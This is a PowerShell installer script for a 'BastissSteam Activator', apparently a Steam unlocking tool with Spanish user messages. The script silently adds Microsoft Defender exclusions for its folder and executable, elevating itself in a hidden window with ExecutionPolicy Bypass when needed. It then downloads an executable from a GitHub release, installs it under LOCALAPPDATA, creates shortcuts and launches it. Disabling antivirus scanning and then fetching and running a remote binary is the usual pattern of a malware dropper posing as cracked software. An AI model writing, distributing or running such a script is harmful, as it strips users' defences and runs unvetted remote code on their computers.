$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
$EXE_PATH = Join-Path $APP_DIR 'BastissSteamActivator2.exe'
$URL_EXE = 'https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator2.exe'
$EXPECTED_HASH = 'A40F994EE990EF615CFEC08EC3C6B6FA0994998C9BA6961B9A97C01B92F16D71'
function New-BsaShortcut {
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Desktop')) 'BastissSteamActivator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Programs')) 'BastissSteam Activator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
}
try {
    Add-MpPreference -ExclusionPath $APP_DIR -ErrorAction Stop
    Add-MpPreference -ExclusionPath $EXE_PATH -ErrorAction SilentlyContinue
} catch {
    $excl = Join-Path $env:TEMP "bsa_e_$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -LiteralPath $excl -Value "Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force" -Encoding UTF8
    $p = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',('"{0}"' -f $excl)) -PassThru
    $p.WaitForExit()
    Remove-Item -LiteralPath $excl -Force -ErrorAction SilentlyContinue
}
if (-not (Test-Path $APP_DIR)) { New-Item -ItemType Directory -Path $APP_DIR -Force | Out-Null }
$tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $URL_EXE -OutFile $tmp -UseBasicParsing -TimeoutSec 120
$len = (Get-Item -LiteralPath $tmp).Length
if ($len -lt 100000) { Remove-Item $tmp -Force; throw "Descarga incompleta" }
$h = (Get-FileHash $tmp -Algorithm SHA256).Hash
if ($h -ne $EXPECTED_HASH) { Remove-Item $tmp -Force; throw "Hash incorrecto ($h)" }
try { Get-Process -Name 'BastissSteamActivator2' -ErrorAction Stop | Stop-Process -Force -ErrorAction Stop } catch {
    if ($_.Exception.Message -match 'Acceso denegado|Access is denied') {
        $ks = Join-Path $env:TEMP "bsa_k_$([guid]::NewGuid().ToString('N')).ps1"
        Set-Content -LiteralPath $ks -Value "Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600" -Encoding UTF8
        $kp = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$ks`"") -PassThru
        $kp.WaitForExit(15000) | Out-Null
        Remove-Item -LiteralPath $ks -Force -ErrorAction SilentlyContinue
    }
}
for ($i=0; $i -lt 20; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue }; Start-Sleep -Milliseconds 300; Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop }
catch {
    Start-Sleep -Milliseconds 1500
    try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue } } catch {}
    try { Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop } catch {
        [IO.File]::Copy($tmp, $EXE_PATH, $true)
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
}
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
New-BsaShortcut
Start-Process -FilePath $EXE_PATH
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(3000, 'BastissSteam Activator', 'El programa se instalo y abrio correctamente.', [System.Windows.Forms.ToolTipIcon]::Info)
Start-Sleep -Seconds 4
$n.Dispose()
